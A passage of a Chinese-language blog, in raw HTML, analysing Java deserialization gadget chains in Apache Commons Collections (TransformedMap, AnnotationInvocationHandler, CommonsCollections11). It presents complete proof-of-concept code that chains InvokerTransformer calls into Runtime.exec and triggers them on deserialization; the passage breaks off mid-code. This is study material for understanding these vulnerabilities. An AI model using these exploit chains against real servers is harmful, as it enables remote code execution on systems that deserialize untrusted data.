class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历Map元素，并调用setValue方法</span></span><br><span class="line">        <span class="keyword">for</span>(Object obj: transformedMap.entrySet())&#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">            entry.setValue(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后通过<code>setValue()</code>方法调用了<code>checkSetValue()</code>方法，从而造成命令执行<br><img src="images/image-20220913180841818.png" alt="image-20220913180841818"></p><p><img src="images/image-20220913180501737.png" alt="image-20220913180501737"></p><p>模拟成现实情况（客户端发送请求-服务端处理请求）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(transformedMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">      <span class="comment">// 通过readObject方法进行反序列化</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220913183349120.png" alt="image-20220913183349120"></p><p>相比之前触发反序列化的方式更为容易，当开发者将反序列化的对象转换成<code>Map</code>类型之后，通过<code>put()</code>、<code>putAll()</code>或者<code>setValue()</code>对<code>map</code>进行操作即可完成命令执行。</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>前面的利用链仍需要服务端进行反序列化转换成<code>Map</code>对象，并进行赋值或者修改操作才可以触发命令执行。为了使得我们的攻击<code>payload</code>在服务端仅经过反序列化就可以触发，需要寻找新的利用点：<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>接下来我们看看<code>AnnotationInvocationHandler</code>类的源码，在构造函数中，传进的<code>Map</code>类型参数赋值给<code>memberValues</code><br><img src="images/image-20220914113429062.png" alt="image-20220914113429062"></p><p>在<code>readObject()</code>方法中，对<code>memberValues</code>进行遍历，最终当<code>var7</code>不为<code>null</code>时，通过<code>setValue()</code>进行修改操作，因此可以进入前面<code>TransformedMap</code>类中的<code>checkSetValue()</code>，触发命令执行<br><img src="images/image-20220914113611289.png" alt="image-20220914113611289"></p><p>POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            <span class="comment">// 设置方法访问权限</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">            <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            out.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220914115903758.png" alt="image-20220914115903758"></p><p>这里需要注意<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>中的<code>key</code>必须为<code>value</code>。<strong>具体原因如下：</strong></p><p>在构造方法中我们传入的<code>Class</code>需要继承<code>Annotation</code>注解<br><img src="images/image-20221004170152670.png" alt="image-20221004170152670"></p><p>因此在 POC 里，我们构造攻击链的时候传入了 Java 标准库中的<code>Target.class</code>元注解<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure></p><p>查看<code>@Target</code>元注解的源码，其中已经定义了参数元素为<code>value</code><br><img src="images/image-20221004170044091.png" alt="image-20221004170044091"></p><p>在<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法中，<code>var2 = AnnotationType.getInstance(this.type);</code>对<code>Target</code>元注解进行了处理，随后传到了<code>Map</code>类型参数<code>var3</code>中</p><p><img src="images/image-20220915000423127.png" alt="image-20220915000423127"></p><p>随后在<code>var6</code>中取得了我们前面设置的<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>的<code>key</code>，也就是<code>value</code>，接着在<code>var7</code>中获得的类<code>java.lang.annotation.ElementType</code>不为空满足<code>if</code>条件进入循环。</p><p>由此可得知，如果我们传入的是<code>@Target</code>元注解，我们构造的条件要满足：<code>map.put(&quot;value&quot;,xxxx);</code>才能进入<code>if</code>条件里触发命令执行。</p><p><strong>该条攻击利用链的限制</strong></p><p>JDK 版本需要在 8u71 之前（本文 JDK 版本为 8u60），在此之后的版本都无法触发命令执行，原因是<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法进行了修改，不再直接使用反序列化得到的<code>Map</code>进行操作，而是新建了一个<code>LinkedHashMap</code>对象。</p><p>后续相关操作都基于<code>LinkedHashMap</code>对象，而我们构造的<code>map</code>不再执行<code>put()</code>或者<code>setValue()</code>，因此无法触发命令执行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections11利用链分析</title>
      <link href="/2022/11/10/CommonsCollections11/"/>
      <url>/2022/11/10/CommonsCollections11/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections11利用链分析"><a href="#CommonsCollections11利用链分析" class="headerlink" title="CommonsCollections11利用链分析"></a>CommonsCollections11利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections11</code>链子的利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK版本暂无</span><br></pre></td></tr></table></figure><p>可能学到这里，你和我一样会有一个疑问：<code>CommonsCollections6</code>已经通杀<code>3.1-3.2.1</code>的情况下，为什么还要学该版本下的其他链子？</p><p>个人觉得<code>CommonsCollection11</code>的存在是为了解决在<code>CommonsCollections 3.1 - 3.2.1</code>的版本下加载恶意字节码的问题。除此之外，<code>CommonsCollections6</code>在<code>shiro</code>中使用时会报错，至于为什么，具体答案留到<code>shiro</code>章节学习时再进行解惑。</p><p>这里提到恶意字节码，很快能想到前面学习的<code>CommonsCollections2</code>这条链子，聪明的你应该已经能想到了，<code>CommonsCollections11</code>就是<code>CommonsCollections2</code>和<code>CommonsCollections6</code>结合而来。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先回忆一下，<code>CommonsCollections2</code>链子只所以限制版本为<code>CommonsCollections 4.0</code>，则是因为 gadget 中用到了<code>TransformingComparator</code>类，而该类只有在 4.0 版本的时候才实现了<code>serializable</code>接口。</p><p>在<code>3.1 - 3.2.1</code>版本的时候无法使用该类，而是使用了<code>CommonsCollections6</code>中的<code>TiedMapEntry</code>类来触发<code>LazyMap#get()</code>，最后执行<code>transform()</code>方法。接下来还剩一个问题，就是如何触发<code>TemplatesImpl#newTransformer()</code>方法来加载恶意字节码？</p><p>在<code>CommonsCollections11</code>中只单独使用<code>InvokerTransformer</code>类，通过反射修改<code>iMethodName</code>为<code>newTransformer()</code>方法。 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">        commonsCollections11.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span 